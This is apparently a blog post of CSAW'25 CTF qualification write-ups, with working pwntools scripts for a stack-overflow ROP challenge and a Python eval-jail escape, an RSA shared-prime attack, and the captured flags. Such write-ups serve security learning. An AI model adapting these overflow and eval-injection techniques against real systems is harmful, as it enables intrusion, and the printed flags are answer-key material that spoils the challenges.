---
title: "Write-ups: CSAW'25 CTF Qualification Round"
published: 2025-09-13
updated: 2025-09-15
description: "Write-ups for CSAW'25 CTF Qualification Round."
tags: ["Pwn", "Misc", "OSINT", "Crypto", "Write-ups"]
category: "Write-ups"
draft: false
---

# Discord

## Information

- Category: Misc
- Points: 10

## Description

> Join the Discord for our super secret flag!

## Write-up

本来以为是和机器人聊天，发现这机器人还挺难斥候，怀疑是真人。但凡我表现出任何索要 flag 的姿态他就不高兴了……最后发现 flag 在 #rules channel，严重怀疑是不是自己眼睛瞎了，还是当时脑子没完全开机，居然跑去和机器人聊天，然后这机器人也是牛逼，我说我要睡觉了，人家第二天晚上还主动来找我，问我醒了没，继续聊啊……

## Flag

:spoiler[`csawctf{w3Ic0m3_70_th3_22nd_y34r_0f_CSAW}`]

# Star Scream (Old)

## Information

- Category: OSINT
- Points: 50

## Description

> In 2017, a daring trio of tinkerers sent five midnight-black specks skyward. No bigger than loaves of bread, yet destined to circle Earth 400km above the clouds. Two of the tinkerers dreamt of showing their country's flags to the stars, but six weeks before my planned farewell, I tumbled back to the blue. Who am I?
>
> When you've sleuthed out the answer, submit: csawctf{Satelite-name_satcatnumber}

## Write-up

13 号的题，没想到出现了一些戏剧性的事情，比赛延期 24h 并修改了题目……懒得删了，记录一下这个旧 flag……

14 号的新题没做出来……/抓狂

### References

- [Birds-1](https://en.wikipedia.org/wiki/Birds-1)
- [GhanaSat-1](https://en.wikipedia.org/wiki/GhanaSat-1)

## Flag

:spoiler[`csawctf{GhanaSat-1_42821}`]

# Mooneys Bookstore

## Information

- Category: Pwn
- Points: 500

## Description

> You think it's just input. Just another binary.
> But this stack? It's mine.
> Overflow it. Follow the trail. I left a key behind.
> If you're paying attention, you'll find it.
> Slip once, and the story ends before it begins.

## Write-up

简单题……我好菜啊 :sob:

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ROP,
    args,
    context,
    flat,
    p64,
    process,
    raw_input,
    remote,
)

FILE = "./overflow_me"
HOST, PORT = "chals.ctf.csaw.io", 21006

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
rop = ROP(elf)


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    secret_addr = elf.bss() + 0x28
    target.success(f"secret addr: {hex(secret_addr)}")

    target.sendafter(b"Tell me its address", p64(secret_addr))
    leak = target.recvlines(2)[1]
    secret = int(leak, 16).to_bytes(0x8, "little")
    target.success(f"leaked_addr: 0x{secret.hex()}")
    target.sendafter(b"the story unlocks", secret)

    target.recvuntil(b"for you: ")
    val = int(target.recvline().strip(), 16).to_bytes(0x8, "little")
    target.success(f"val: 0x{val.hex()}")

    # raw_input("DEBUG")
    payload = flat(
        b"A" * 64,
        val,
        b"A" * 0x10,
        rop.ret.address,
        elf.sym["get_flag"],
    )
    target.sendlineafter(b"into this story.", payload)

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`csawctf{U_w3r3_n3v3r_m3@nt_2_s33_th3_st@ck~but_I_l3t_U_1n_b3c@us3_1_l0v3_U~d8K#xY_q1W9eVz2NpL7}`]

# Obligatory RSA

## Information

- Category: Crypto
- Points: 500

## Description

> Crypto just wouldn't be crypto without one!

## Write-up

RSA 简单啊，~直接拷打 AI xD~

## Exploit

```python
#!/usr/bin/env python3

import math

from Crypto.Util.number import inverse, long_to_bytes

e = 65537
n1 = 129092526753383933030272290277107300767707654330551632967994396398045326531320303963182497488182474202461120692162734880438261410066549845639992024037416720228421076282632904598519793243067220342037144864237020757818263128301138206081187472003821789897063195512919097350247829148288118913456964033001399074373
n2 = 108355113470836594630192960651980673780103497896732213011958303033575870030505528169174729530490405910634291415346360688290452976527316909469646908289732023715737439312572012648165819533234604850608390233938174081867146846639110685928136323983961395098632140681799175543046722931901766226759894951292033805879
d1 = 88843495989869871001559754882918076779858404440780391818567639602073173623287821751315349650577023725245222074965050035045516207303078461168168819365025746973589245131570143944718203046457391270418459087764266630890566079039821735168805805866019315142070438225092171304343352469029480503113942986147848666077
d2 = 94565144275929764017241865812435668644218918537941567711225644474418458115544003036362558987818610553975855551983688286593672386482543188020042082319191545660551324293738920214028045344249670512999137548994496577128446165632885775744795722253354007167294035878656056258332703809173397147948143695113558988035


def solve():
    print("--- Starting Common Factor Attack ---")
    p = math.gcd(n1, n2)

    if p > 1:
        print("[+] Success! A common factor was found.")
        print("Shared Prime (p): {p}\n")

        q1 = n1 // p
        q2 = n2 // p

        print("--- Factoring Results ---")
        print("q1: {q1}")
        print("q2: {q2}")
        print("[+] Verification successful: p * q1 == n1 and p * q2 == n2\n")

        # Calculate Euler's totient function
        phi1 = (p - 1) * (q1 - 1)
        phi2 = (p - 1) * (q2 - 1)

        # Calculate the correct private keys
        d_correct_1 = inverse(e, phi1)
        d_correct_2 = inverse(e, phi2)
        print("--- Calculated Correct Private Keys ---")
        print(f"d_correct_1: {d_correct_1}")
        print(f"d_correct_2: {d_correct_2}\n")

        print("--- Decrypting given 'd' values as ciphertext ---")

        try:
            plaintext_1 = pow(d1, d_correct_1, n1)
            flag_1 = long_to_bytes(plaintext_1)
            print(f"[+] Decrypted plaintext from d1: {flag_1}")
        except Exception as ex:
            print(f"[-] Decryption failed for d1: {ex}")

        try:
            plaintext_2 = pow(d2, d_correct_2, n2)
            flag_2 = long_to_bytes(plaintext_2)
            print(f"[+] Decrypted plaintext from d2: {flag_2}")
        except Exception as ex:
            print(f"[-] Decryption failed for d2: {ex}")

    else:
        print("[-] Attack failed. n1 and n2 do not share a common factor.")


solve()
```

## Flag

:spoiler[`csawctf{wH04m1_70d3Ny_7r4D1710n_4820391578649021735}`]

# Galaxy

## Information

- Category: Misc
- Points: 500

## Description

> Reach for the stars!

## Write-up

调教 AI 出的……工具就应该拿来用不是吗 LOL

## Exploit

```python
#!/usr/bin/env python3

from pwn import context, process, remote, args
import sys

FILE = "./main.py"
HOST, PORT = "chals.ctf.csaw.io", 21009

context(log_level="debug")

alphabet = "abcdefghijklmnopqrstuvwxyz'"


def launch():
    global target
    if args.L:
        target = process(["python3", FILE])
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    def send_recv_str(payload):
        target.recvuntil(b"> ", timeout=1)
        target.sendline(payload.encode())
        try:
            line = target.recvline()
            if not line:
                return ""
            return line.decode(errors="ignore").strip()
        except Exception:
            return ""

    target.recvuntil(b"> ")

    apost_cipher = None
    for c in alphabet:
        # if ciphertext c -> "'", then c + "[" + c becomes "'['" after unwarp, eval("'['") -> prints [
        resp = send_recv_str(c + "[" + c)
        if resp and "[" in resp and resp != "no galaxy":
            apost_cipher = c
            target.info(
                f"Found apostrophe ciphertext: {apost_cipher!r} (response={resp!r})"
            )
            break

    if not apost_cipher:
        target.failure("Could not find apostrophe ciphertext. Abort.")
        target.close()
        sys.exit(1)

    # build cipher -> plaintext mapping by probing apost_cipher + candidate + apost_cipher
    cipher_to_plain = {}
    for c in alphabet:
        resp = send_recv_str(apost_cipher + c + apost_cipher)
        # on success resp is printed plaintext character (single char)
        if resp and resp != "no galaxy":
            cipher_to_plain[c] = resp[0]
            target.debug(f"cipher {c!r} -> plain {cipher_to_plain[c]!r}")
        else:
            cipher_to_plain[c] = None

    # the candidate that maps to "'" will have produced no valid eval (None).
    # fill it explicitly using apost_cipher we discovered.
    cipher_to_plain[apost_cipher] = "'"
    target.info(f'Explicitly set cipher {apost_cipher!r} -> plain "\'"')

    # invert mapping to get plaintext -> ciphertext
    plain_to_cipher = {}
    for c, pch in cipher_to_plain.items():
        if pch is not None:
            # if multiple c map to same pch (shouldn't), last one wins — but mapping is bijection here
            plain_to_cipher[pch] = c

    # sanity check
    missing = [ch for ch in alphabet if ch not in plain_to_cipher]
    if missing:
        target.warning(f"Missing plaintext->cipher mappings for: {missing}")
    else:
        target.info("Recovered full plaintext->cipher mapping for a-z and apostrophe.")

    # helper to encrypt plaintext expression using mapping
    def encrypt_plaintext(expr):
        out = []
        for ch in expr:
            if ch in plain_to_cipher:
                out.append(plain_to_cipher[ch])
            else:
                out.append(ch)
        return "".join(out)

    # negative index expression using allowed chars only
    def neg_expr(n):
        """
        Build an expression that evaluates to -n using only allowed characters.
        Use ~('a'<'b') == -2 and ~('a'<'a') == -1, combine with +.
        """
        q = n // 2
        r = n % 2
        parts = ["~('a'<'b')" for _ in range(q)]
        if r:
            parts.append("~('a'<'a')")
        return "+".join(parts)

    # ensure we can encrypt 'spiral' (all letters present)
    for ch in "spiral":
        if ch not in plain_to_cipher:
            target.failure(f"Missing mapping for letter {ch!r}. Aborting.")
            target.close()
            sys.exit(1)
    enc_spiral = encrypt_plaintext("spiral")
    target.info(f"Encrypted 'spiral' -> {enc_spiral!r}")

    # dump characters one-by-one using negative indices
    flag_chars = []
    MAX_CHARS = 80
    for i in range(1, MAX_CHARS + 1):
        idx_plain = neg_expr(i)
        expr_plain = f"spiral[{idx_plain}]"
        expr_cipher = encrypt_plaintext(expr_plain)
        resp = send_recv_str(expr_cipher)
        if not resp or resp == "no galaxy":
            target.info(f"Index -{i} out-of-range or eval error (resp={resp!r}), stop.")
            break
        ch = resp[0]
        target.info(f"got index -{i}: {repr(ch)}")
        flag_chars.append(ch)

    flag = "".join(reversed(flag_chars))
    target.success(f"Recovered flag (partial/full): {flag}")

    target.close()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`csawctf{g@l@xy_0bserv3r$}`]
